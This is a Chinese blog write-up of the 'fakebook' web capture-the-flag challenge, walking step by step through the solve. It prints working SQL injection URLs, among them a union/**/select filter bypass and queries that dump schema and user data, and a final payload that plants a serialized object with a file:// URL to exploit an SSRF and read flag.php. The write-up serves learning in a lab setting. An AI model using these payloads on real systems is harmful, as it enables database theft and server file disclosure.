<!--yml
category: 未分类
date: 2022-04-26 14:52:27
-->

# 攻防世界-web-fakebook-从0到1的解题历程writeup_CTF小白的博客-CSDN博客_攻防世界fakebook

> 来源：[https://blog.csdn.net/qq_41429081/article/details/105495932](https://blog.csdn.net/qq_41429081/article/details/105495932)

## 题目分析

拿到题目发现有注册登录界面，一般给了注册界面的很少会是sql注入登陆界面的，所以尝试先注册一个账号。

![图片](img/7bcc9a1479e36cefd40e60647078cc3d.png)

发现这边会加载注册时填写的blog地址，并将内容加载到一个iframe中。

这时发现网址为

```
http://159.138.137.79:55692/view.php?no=1 
```

感觉就是有sql注入漏洞，虽然不知道考点在不在这，但是先注了再说。
![图片](img/7c8917bab4405897ad9b8cef71d2a1c2.png)

尝试了一下就发现是数字型注入

sqlmap一把梭失败emmm

尝试下手工注入

获取到列数位4列

```
http://159.138.137.79:55692/view.php?no=1 order by 4# 
```

查询数据库

```
http://159.138.137.79:55692/view.php?no=-1 union select 1,1,1,database()# 
```

![图片](img/dbb791027ff8b0daa9294636b98c0ac4.png)

果然，找到了sqlmap失败的原因。既然这边有过滤那么本题不出意外考点应该就在这里了。

## 解题思路

第一步找到过滤掉了哪些。

尝试了一下发现过滤了union select

使用union/**/select绕过

```
http://159.138.137.79:55692/view.php?no=-6 union/**/select 1,2,3,4# 
```

![图片](img/23f096d91195af69272bb5625c2b08d7.png)

发现username处显示出来了，其余地方为反序列化失败。所以先在username处将数据带出。

```
http://159.138.137.79:55692/view.php?no=-6 union/**/select 1,database(),3,4 
```

得到database为fakebook

```
http://159.138.137.79:55692/view.php?no=-6 union/**/select 1,(SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.tables WHERE TABLE_SCHEMA="fakebook"),3,4 
```

得到表名为users

```
http://159.138.137.79:55692/view.php?no=-6 union/**/select 1,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = 'users'),3,4 
```

得到字段为no,username,passwd,data
明显no，username，passwd为账号基本信息，查询data

```
http://159.138.137.79:55692/view.php?no=-6 union/**/select 1,(SELECT GROUP_CONCAT(data) FROM fakebook.users),3,4 
```

得到
![图片](img/2d8e3ace9a5052f394f66fce66f69c6e.png)

将得到的data传入联合查询第四列的返回结果

![图片](img/d0d309c85dc0bb77f4de4697db843f15.png)

发现可以成功解析。

使用nikto对网站进行扫描发现

![图片](img/547c73fd31bd68a43377a6129d6c2bf2.png)

有user.php的备份文件

```
function get($url)
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if($httpCode == 404) {
            return 404;
        }
        curl_close($ch);
        return $output;
    } 
```

这边get传入的就是用户信息中的blog地址，如果不是404就会将内容读出来。
存在ssrf文件读取

```
http://159.138.137.79:55692/view.php?no=-6 union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:9;s:4:"blog";s:29:"file:///var/www/html/flag.php";}' 
```

读取file:///var/www/html/flag.php即可